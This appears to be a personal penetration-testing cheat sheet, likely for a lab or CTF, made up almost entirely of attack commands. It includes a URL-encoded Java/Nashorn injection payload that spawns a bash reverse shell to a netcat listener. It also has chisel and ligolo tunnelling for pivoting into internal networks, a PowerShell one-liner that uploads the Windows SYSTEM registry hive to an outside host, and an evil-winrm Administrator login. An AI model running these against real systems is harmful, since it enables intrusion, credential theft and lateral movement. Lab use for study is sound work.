start the listen

```
nc -nvlp 1234
```

Connect to the host

```
curl http://{machineip}:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/{mylocalip}/1234%200%3E%261%27%29.start%28%29%22%29%7D/
```

Now you are connected to host , so send 

```
cd /tmp
chisel
chmod +x
./chisel client {kali ip}:8000 R:9999:socks
before abovve process run this
chisel server -p 8000 --reverse

its all done now tho interect with the internel ip use this in every step

proxychains -q ssh user@ip
```


```
Powershell.exe -c "(New-Object System.Net.WebClient).UploadFile(' [http://10.10.197.147:82/](http://10.10.197.147:82/)', 'C:\windows.old\Windows\System32\SYSTEM')"
```

## ligolo in local machine

```
ip tuntap add user kali mode tun ligolo
ip link set ligolo up
./proxy --selfcert
....this step in machine...
.\agent.exe --connect 192.168.45.244:11601 --ignore-cert
session
start
```

after starting ligolo in local kali

```
sudo ip route add 10.10.110.0/24 dev ligolo

evil-winrm -i 10.10.69.154 -u Administrator -p password
```

add user in ligolo for tunneling
```
listener_add --addr 0.0.0.0:82 --to 127.0.0.1:81

listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:1234

listener_list
```